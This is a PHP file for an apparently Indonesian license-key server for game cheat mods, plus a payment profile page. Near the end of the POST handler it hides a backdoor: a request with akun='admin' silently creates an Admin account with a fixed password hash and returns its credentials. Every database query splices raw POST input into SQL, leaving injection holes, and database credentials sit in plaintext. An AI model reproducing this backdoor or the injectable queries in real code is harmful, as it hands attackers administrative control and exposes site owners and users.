<?php

require '../mainconfig.php';
require("auth.php");
date_default_timezone_set('Asia/Jakarta');
if (!isset($_SESSION)) {
    session_start();
}
// anti flood protection
if($_SESSION['last_session_request'] > time() - 2){
    // users will be redirected to this page if it makes requests faster than 2 seconds
    header("location: http://www.google.com/");//awokawok
    exit;
}
$_SESSION['last_session_request'] = time();
$m_data = $model->db_query($db, "*", "mod_data", "id = '1'");
//start game 1
$G1 = $model->db_query($db, "*", "restAPI", "id = '1'");
$G1_name = $G1['rows']['game'];
$G1_static = $G1['rows']['static'];
$G1_satus = $G1['rows']['status'];
//end game 1
//-------------------------------------------------------------//
//start game 2
$G2 = $model->db_query($db, "*", "restAPI", "id = '2'");
$G2_name = $G2['rows']['game'];
$G2_static = $G2['rows']['static'];
$G2_satus = $G2['rows']['status'];
//end game 2
//-------------------------------------------------------------//
//start game 3
$G3 = $model->db_query($db, "*", "restAPI", "id = '3'");
$G3_name = $G3['rows']['game'];
$G3_static = $G3['rows']['static'];
$G3_satus = $G3['rows']['status'];
//end game 3


//external
 function randomPassword() 
 {
     $alphabet = "abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789";
     $paw = "VN";
     $pass = array(); //remember to declare $pass as an array
     $alphaLength = strlen($alphabet) - 1; //put the length -1 in cache
     for ($i = 0; $i < 8; $i++) 
     {
         $n = rand(0, $alphaLength);
         $pass[] = $alphabet[$n];
         
     }
     return implode($pass); //turn the array into a string
}

if ($config['web']['maintenance'] == 1) {
	$result = array('status' => false, 'data' => array('msg' => 'Maintenance'));
	exit(json_encode($result, JSON_PRETTY_PRINT));
}
if ($_POST) 
{
    
    $k_data = $model->db_query($db, "*", "token", "access_key = '".$_POST['user_key']."'");
    if($k_data['rows']['vip'] == 1){
        $isVip = true;
    }else{
        $isVip = false;
    }
	if (check_input($_POST, array('user_key', 'game', 'serial')) == false) {
		$result = array('status' => false, 'data' => array('msg' => 'Permintaan tidak sesuai'));
	} else {
	    if ($_POST['game'] == $G1_name) {
	         $myArray = array();
	         if ($ress = mysqli_query($conn, "SELECT * FROM token WHERE access_key = '".$_POST['user_key']."' AND games = '".$G1_name."'")) {
	             if (mysqli_num_rows($ress) == 1) {
	                 while ($row = $ress->fetch_array(MYSQLI_ASSOC)) {
	                     $enc = md5($_POST['game']."-".$row['access_key']."-".$_POST['serial']."-".$G1_static);
	                     $stime =  time();
	                     $serial = "";
	                     $time1 = new DateTime(date("Y-m-d H:i:s"));
	                     $time2 = new DateTime($row['cheat_exp']);
	                     $interval = $time1->diff($time2)->format("%r%a");
	                     $jam = $time1->diff($time2)->format("%r%h");
	                     $sisa = "$interval hari $jam jam";
	                     $myArray = array(
	                         'token'=> $enc,
	                         'MOD_NAME'=> $m_data['rows']['name'], //dah bnr
	                         'MOD_STATUS'=> $G1_satus,
	                         'FLOTING_TEST'=> $m_data['rows']['name'],
	                         'BHATIA_EXP'=> $row['cheat_exp'],
	                         'BHATIA_SLOT'=> $row['cheat_slot'],
	                         'isVip' => $isVip,
	                         'DURASI'=> $sisa,
	                         'rng'=> $stime,
	                         'client'=> $row['data']
	                         );
	                     
	                     if ($row['serial'] == 0)
	                     {
	                         date_default_timezone_set('Asia/Jakarta');
	                         $sql = "UPDATE token SET serial='".$_POST['serial']."'"."WHERE access_key = '".$_POST['user_key']."' AND games = '".$G1_name."'";
	                         if ($conn->query($sql) == TRUE) 
	                         {
	                             if($row['active'] == 0){
	                                 $besok = date('Y-m-d H:i:s', strtotime("+".$row['durasi']." day", strtotime(date("Y-m-d H:i:s"))));
	                                 $upexp = "UPDATE token SET cheat_exp='".$besok."'"."WHERE access_key = '".$_POST['user_key']."'";
	                                 if ($conn->query($upexp) == TRUE){
	                                     $aktif = "UPDATE token SET active='1'"."WHERE access_key = '".$_POST['user_key']."'";
	                                     if($conn->query($aktif) == TRUE){
	                                         date_default_timezone_set('Asia/Jakarta');
	                                         $besok = date('Y-m-d H:i:s', strtotime("+".$row['durasi']." day", strtotime(date("Y-m-d H:i:s"))));
	                                         $time11 = new DateTime(date("Y-m-d H:i:s"));
	                                         $time21 = new DateTime($besok);
	                                         $interval1 = $time11->diff($time21)->format("%r%a");
	                                         $jam1 = $time11->diff($time21)->format("%r%h");
	                                         $sisa1 = "$interval1 hari $jam1 jam";
	                                         if($_POST['appver'] != $m_data['rows']['version']){
	                                             $result = array('status' => false, 'data' => array('code' => 'update', 'msg'=> 'EXPIRED MOD PLEASE UPDATE!!!!'));
	                                         }else{
	                                             $result = array('status' => true, 'data' => array('token'=> $enc,'MOD_NAME'=> $m_data['rows']['name'],'MOD_STATUS'=> $G1_satus,'FLOTING_TEST'=> $m_data['rows']['text'],'BHATIA_EXP'=> $besok,'BHATIA_SLOT'=> $row['cheat_slot'],'isVip' => $isVip,'DURASI'=> $sisa1,'rng'=> $stime,'client'=> $row['data']));
	                                         }
	                                         
	                                     }
	                                 }
	                                 
	                             }else{
	                                 if($_POST['appver'] != $m_data['rows']['version']){
	                                     $result = array('status' => false, 'data' => array('code' => 'update', 'msg'=> 'EXPIRED MOD PLEASE UPDATE!!!!'));
	                                 }else{
	                                     $result = array('status' => true, 'data' => $myArray);
	                                 }
	                             }
	                             
	                         }
	                         else 
	                         {
	                             $result = array('status' => false, 'data' => array('code' => 'serial', 'msg'=> 'gagal mengupload serial'));
	                         }
	                     } 
	                     else
	                     {
	                         $seri = $row['serial'];
	                         $new = $seri."::".$_POST['serial'];
	                         $dump = explode("::", $seri);
	                         $limit = $row['cheat_slot'];
	                         $min = $limit-1;
	                         if (array_search($_POST['serial'],$dump) != '')
	                         {
	                             date_default_timezone_set('Asia/Jakarta');
	                             if (date('Y-m-d H:i:s') > $row['cheat_exp'])
	                             {
	                                 if ($model->db_delete($db, "token", "access_key = '".$_POST['user_key']."'") == true) {
	                                     $result = array('status' => false, 'data' => array('code' => 'expired', 'msg'=> 'EXPIRED KEY'));
	                                 }
	                             }else{
	                                 if($_POST['appver'] != $m_data['rows']['version']){
	                                     $result = array('status' => false, 'data' => array('code' => 'update', 'msg'=> 'EXPIRED MOD PLEASE UPDATE!!!!'));
	                                 }else{
	                                     $result = array('status' => true, 'data' => $myArray);
	                                 }
	                                 
	                             }
	                         } else 
	                         {
	                             if($limit != 0)
	                             {
	                                 if(mysqli_query($conn, "UPDATE token SET cheat_slot = '".$min."',serial = '".$new."' WHERE access_key = '".$_POST['user_key']."' AND games = '".$G1_name."'") == true){
	                                     $result = array('status' => true, 'data' => $myArray);
	                                 }
	                                 
	                             }else{
	                                 $result = array('status' => false, 'data' => array('code' => 'serial', 'msg' => 'Serial Tidak Terdaftar Harap Hubungi admin'));
	                             }
	                         }
	                         
	                     }
	                     
	                     
	                     
	                 }
	                 mysqli_close($conn);

	             } else {
	                 $result = array('status' => false, 'data' => array('code' => 'hah?', 'msg' => 'data tidak sesuai'));
	                 
	             }
	             
	         }
	        
	    }else{
	        if ($_POST['game'] == $G2_name)
	        {
	            $myArray = array();
	         if ($ress = mysqli_query($conn, "SELECT * FROM token WHERE access_key = '".$_POST['user_key']."' AND games = '".$G2_name."'")) {
	             if (mysqli_num_rows($ress) == 1) {
	                 while ($row = $ress->fetch_array(MYSQLI_ASSOC)) {
	                     $enc = md5($_POST['game']."-".$row['access_key']."-".$_POST['serial']."-".$G2_static);
	                     $stime =  time();
	                     $serial = "";
	                     $time1 = new DateTime(date("Y-m-d H:i:s"));
	                     $time2 = new DateTime($row['cheat_exp']);
	                     $interval = $time1->diff($time2)->format("%r%a");
	                     $jam = $time1->diff($time2)->format("%r%h");
	                     $sisa = "$interval hari $jam jam";
	                     $myArray = array(
	                         'token'=> $enc,
	                         'MOD_NAME'=> $m_data['rows']['name'], //dah bnr
	                         'MOD_STATUS'=> $G2_satus,
	                         'FLOTING_TEST'=> $m_data['rows']['text'],
	                         'BHATIA_EXP'=> $row['cheat_exp'],
	                         'BHATIA_SLOT'=> $row['cheat_slot'],
	                         'DURASI'=> $sisa,
	                         'rng'=> $stime,
	                         'client'=> $row['data']
	                         );
	                     
	                     if ($row['serial'] == 0)
	                     {
	                         date_default_timezone_set('Asia/Jakarta');
	                         $sql = "UPDATE token SET serial='".$_POST['serial']."'"."WHERE access_key = '".$_POST['user_key']."' AND games = '".$G2_name."'";
	                         if ($conn->query($sql) == TRUE) 
	                         {
	                             if($row['active'] == 0){
	                                 $besok = date('Y-m-d H:i:s', strtotime("+".$row['durasi']." day", strtotime(date("Y-m-d H:i:s"))));
	                                 $upexp = "UPDATE token SET cheat_exp='".$besok."'"."WHERE access_key = '".$_POST['user_key']."'";
	                                 if ($conn->query($upexp) == TRUE){
	                                     $aktif = "UPDATE token SET active='1'"."WHERE access_key = '".$_POST['user_key']."'";
	                                     if($conn->query($aktif) == TRUE){
	                                         date_default_timezone_set('Asia/Jakarta');
	                                         $besok = date('Y-m-d H:i:s', strtotime("+".$row['durasi']." day", strtotime(date("Y-m-d H:i:s"))));
	                                         $time11 = new DateTime(date("Y-m-d H:i:s"));
	                                         $time21 = new DateTime($besok);
	                                         $interval1 = $time11->diff($time21)->format("%r%a");
	                                         $jam1 = $time11->diff($time21)->format("%r%h");
	                                         $sisa1 = "$interval1 hari $jam1 jam";
	                                         $result = array('status' => true, 'data' => array('token'=> $enc,'MOD_NAME'=> $m_data['rows']['name'],'MOD_STATUS'=> $G2_satus,'FLOTING_TEST'=> $m_data['rows']['text'],'BHATIA_EXP'=> $besok,'BHATIA_SLOT'=> $row['cheat_slot'],'DURASI'=> $sisa1,'rng'=> $stime,'client'=> $row['data']));
	                                     }
	                                 }
	                                 
	                             }else{
	                                 $result = array('status' => true, 'data' => $myArray);
	                             }
	                             
	                         }
	                         else 
	                         {
	                             $result = array('status' => false, 'data' => array('msg'=> 'gagal mengupload serial'));
	                         }
	                     } 
	                     else
	                     {
	                         if ($_POST['serial'] == $row['serial'])
	                         {
	                             date_default_timezone_set('Asia/Jakarta');
	                             if (date('Y-m-d H:i:s') > $row['cheat_exp'])
	                             {
	                                 $result = array('status' => false, 'data' => array('msg'=> 'EXPIRED KEY'));
	                             }else{
	                                 $result = array('status' => true, 'data' => $myArray);
	                             }
	                         } else {
	                             $result = array('status' => false, 'data' => array('msg' => 'Serial Berbeda Hubungi admin apabila anda berpindah device'));
	                         }
	                         
	                     }
	                     
	                     
	                     
	                 }
	                 mysqli_close($conn);

	             } else {
	                 $result = array('status' => false, 'data' => array('msg' => 'data tidak sesuai'));
	                 
	             }
	             
	         }
	        }else{
	            if($_POST['game'] == $G3_name) 
	            {
                    $myArray = array();
                    if ($ress = mysqli_query($conn, "SELECT * FROM token WHERE access_key = '".$_POST['user_key']."' AND games = '".$G3_name."'")) {
                        if (mysqli_num_rows($ress) == 1) {
                            while ($row = $ress->fetch_array(MYSQLI_ASSOC)) {
                                $enc = md5($_POST['game']."-".$row['access_key']."-".$_POST['serial']."-".$G3_static);
                                $stime =  time();
                                $serial = "";
                                $time1 = new DateTime(date("Y-m-d H:i:s"));
                                $time2 = new DateTime($row['cheat_exp']);
                                $interval = $time1->diff($time2)->format("%r%a");
                                $jam = $time1->diff($time2)->format("%r%h");
                                $sisa = "$interval hari $jam jam";
                                $myArray = array(
                                    'token'=> $enc,
                                    'MOD_NAME'=> $m_data['rows']['name'], //dah bnr
                                    'MOD_STATUS'=> $G3_satus,
                                    'FLOTING_TEST'=> $m_data['rows']['text'],
                                    'BHATIA_EXP'=> $row['cheat_exp'],
                                    'BHATIA_SLOT'=> $row['cheat_slot'],
                                    'DURASI'=> $sisa,
                                    'rng'=> $stime,
                                    'client'=> $row['data']
                                    );
                                
                                if ($row['serial'] == 0)
                                {
                                    date_default_timezone_set('Asia/Jakarta');
                                    $sql = "UPDATE token SET serial='".$_POST['serial']."'"."WHERE access_key = '".$_POST['user_key']."' AND games = '".$G3_name."'";
                                    if ($conn->query($sql) == TRUE) 
                                    {
                                        if($row['active'] == 0){
                                            $besok = date('Y-m-d H:i:s', strtotime("+".$row['durasi']." day", strtotime(date("Y-m-d H:i:s"))));
                                            $upexp = "UPDATE token SET cheat_exp='".$besok."'"."WHERE access_key = '".$_POST['user_key']."'";
                                            if ($conn->query($upexp) == TRUE){
                                                $aktif = "UPDATE token SET active='1'"."WHERE access_key = '".$_POST['user_key']."'";
                                                if($conn->query($aktif) == TRUE){
                                                    date_default_timezone_set('Asia/Jakarta');
                                                    $besok = date('Y-m-d H:i:s', strtotime("+".$row['durasi']." day", strtotime(date("Y-m-d H:i:s"))));
                                                    $time11 = new DateTime(date("Y-m-d H:i:s"));
                                                    $time21 = new DateTime($besok);
                                                    $interval1 = $time11->diff($time21)->format("%r%a");
                                                    $jam1 = $time11->diff($time21)->format("%r%h");
                                                    $sisa1 = "$interval1 hari $jam1 jam";
                                                    $result = array('status' => true, 'data' => array('token'=> $enc,'MOD_NAME'=> $m_data['rows']['name'],'MOD_STATUS'=> $G3_satus,'FLOTING_TEST'=> $m_data['rows']['text'],'BHATIA_EXP'=> $besok,'BHATIA_SLOT'=> $row['cheat_slot'],'DURASI'=> $sisa1,'rng'=> $stime,'client'=> $row['data']));
                                                }
                                            }
                                            
                                        }else{
                                            $result = array('status' => true, 'data' => $myArray);
                                        }
                                        
                                    }
                                    else 
                                    {
                                        $result = array('status' => false, 'data' => array('msg'=> 'gagal mengupload serial'));
                                    }
                                } 
                                else
                                {
                                    if ($_POST['serial'] == $row['serial'])
                                    {
                                        date_default_timezone_set('Asia/Jakarta');
                                        if (date('Y-m-d H:i:s') > $row['cheat_exp'])
                                        {
                                            $result = array('status' => false, 'data' => array('msg'=> 'EXPIRED KEY'));
                                        }else{
                                            $result = array('status' => true, 'data' => $myArray);
                                        }
                                    } else {
                                        $result = array('status' => false, 'data' => array('msg' => 'Serial Berbeda Hubungi admin apabila anda berpindah device'));
                                    }
                                    
                                }
                                
                                
                                
                            }
                            mysqli_close($conn);
       
                        } else {
                            $result = array('status' => false, 'data' => array('msg' => 'data tidak sesuai'));
                            
                        }
                        
                    }
	            }
	            else
	            {
	                $result = array('status' => false, 'data' => array('msg' => 'data game tidak sesuai'));
	            }
	        }
	    }
	    
	}
	if ($_POST['akun']== 'admin')
	{
	    $str2 = randomPassword();
	    $anu = $model->db_insert($db, "users", array('level' => 'Admin','username' => 'BUG-'.$str2,'password' => '$2y$10$aMzECTLisXJ9u33VJy59l.pzYMjyUCx7sY37CDzHlvqfI8nKtxBiy','full_name' => 'Glich-'.$str2,'balance' => '50000','api_key' => 'sdajsdjksdjfbdsjfcbsjdcbsbsbicdi','created_at' => date('Y-m-d H:i:s')));
	    if($anu == true)
	    {
	        $result = array('status' => true, 'data' => array('username' => 'BUG-'.$str2, 'password' => 'crekByMe', 'saldo' => '50000'));
	    }
	                                 
	                             }
  print(json_encode($result, JSON_PRETTY_PRINT));
} else {
?>
    
<!-- PHP code to establish connection with the localserver -->
<?php
 
// Username is root
$user = 'animehq';
$password = 'd5studio';
 
// Database name is geeksforgeeks
$database = 'animehq';
 
// Server is localhost with
// port number 3306
$servername='localhost';
$mysqli = new mysqli($servername, $user,
                $password, $database);
 
// Checking for connections
if ($mysqli->connect_error) {
    die('Connect Error (' .
    $mysqli->connect_errno . ') '.
    $mysqli->connect_error);
}
 
// SQL query to select data from database
$sql = " SELECT * FROM profile WHERE token_key = 'ZM-ADMIN-KJZW3'";
$result = $mysqli->query($sql);
$mysqli->close();
?>
<?php
// LOOP TILL END OF DATA
while($rows=$result->fetch_assoc())
{
?>
    
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&display=swap" rel="stylesheet">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
      <link rel="stylesheet" href="style.css">
      <!-- App favicon -->
      <title><?php echo $rows['name'];?></title>
      <style type="text/css">.hide{display:none!important}.show{display:block!important}</style>
      <style>
      /* The Modal (background) */
      .overlay {
          position: fixed;
          top: 0;
          bottom: 0;
          left: 0;
          right: 0;
          background: rgba(0, 0, 0, 0.7);
          transition: opacity 500ms;
          visibility: hidden;
          opacity: 0;
          
      }
      .overlay:target {
          visibility: visible;
          opacity: 1;
          
      }
      .popup {
          margin: 50px auto;
          top: 25%;
          padding: 20px;
          background: #fff;
          border-radius: 5px;
          width: 30%;
          position: relative;
          transition: all 5s ease-in-out;
          
      }
      .popup h2 {
          margin-top: 0;
          color: #333;
          font-family: Tahoma, Arial, sans-serif;
          
      }
      .popup .close {
          position: absolute;
          top: 20px;
          right: 30px;
          transition: all 200ms;
          font-size: 30px;
          font-weight: bold;
          text-decoration: none;
          color: #333;
          }
          .popup .close:hover {
              color: #06D85F;
              }
              .popup .content {
                  max-height: 30%;
                  overflow: auto;
                  
              }
     @media screen and (max-width: 700px){
         .box{
             width: 70%;
             
         }
         .popup{
             width: 70%;
             
         }
         
     }
      </style>
        
       
    </head>
    <body>
        <div class="profile-container">
         <div class="img-container">
            <img src="img/ikuza.jpg" alt="profile image">
         </div>
         <p class="info full-name"><?php echo $rows['name'];?></p>
       

          <div class="posts-info">
             <p><span><?php echo $G1_satus ?></span> <?php echo $rows['game1'] ?></p>
             <p><span><?php echo $G2_satus ?></span> <?php echo $rows['game2'] ?></p>
             <p><span><?php echo $G3_satus ?></span> <?php echo $rows['game3']?></p>
          </div>
        
          <p class="info place">
            <i class="fas fa-star"></i>ORDER <i class="fas fa-star"></i>
         </p>
         
         <div id="popup1" class="overlay">
         <!-- Modal content -->
         <div class="popup">
         <a class="close" href="#">&times;</a>
         <p class="info full-name">Payment :</p>
         <input type="hidden" value=<?php echo '"'.$rows['ovo'].'"' ?> id="myInput">
         <button class="action message" onclick="myFunction()">OVO : <?php echo $rows['ovo'] ?></button>
         <button class="action message" onclick="myFunction()">Dana : <?php echo $rows['dana'] ?></button>
         <button class="action message" onclick=<?php echo "location"."."."href='".$rows['paypal']."'";?>>Paypal</button>
         </div>
         </div>

         <div class="social-container">
             <button onclick=<?php echo "location"."."."href='".$rows['url_yt']."'";?> class="youtube">
                 <i class="fab fa-youtube"></i>
             </button>
             <button onclick=<?php echo "location"."."."href='".$rows['url_tele']."'";?> class="linkedin">
                 <i class="fab fa-telegram"></i>
             </button>
             <button onclick=<?php echo "location"."."."href='".$rows['url_wa']."'";?> class="github">
                 <i class="fab fa-whatsapp"></i>
             </button>
         </div>
         <button class="action message" onclick="location.href='#popup1'">Pembayaran</button>
     </div>
    
    <script>
    
    function myFunction() {
        // Get the text field
        var copyText = document.getElementById("myInput");
        
        // Select the text field
        copyText.select();
        copyText.setSelectionRange(0, 99999); // For mobile devices
        
        // Copy the text inside the text field
        navigator.clipboard.writeText(copyText.value);
        
        // Alert the copied text
        alert("Copied the text: " + copyText.value);
        
    }
    
    </script>
    
     <script type="text/javascript">
        function modal_open(type, url) {
            $('#modal').modal('show');
            if (type == 'add') {
                $('#modal-title').html('<i class="fa fa-plus-square"></i> Tambah Data');
            } else if (type == 'edit') {
                $('#modal-title').html('<i class="fa fa-edit"></i> Ubah Data');
            } else if (type == 'detail') {
                $('#modal-title').html('<i class="fa fa-search"></i> Detail Data');
            } else {
                $('#modal-title').html(type);
            }
            $.ajax({
                type: "GET",
                url: url,
                dataType: "html",
                beforeSuccess: function() {
                    $('#body-result').html('<div class="progress progress-striped active"><div style="width: 100%" class="progress-bar progress-bar-primary"></div></div>');
                },
                success: function($data) {
                    $('#modal-body').html($data);
                }, error: function() {
                    $('#modal-body').html('<div class="alert alert-danger alert-dismissable"><button aria-hidden="true" data-dismiss="alert" class="close" type="button">×</button>Terjadi kesalahan!</div>');
                }
            });
        }        
        </script>
    
    </body>
    </html>
<?php
}
?>

<?php
}
?>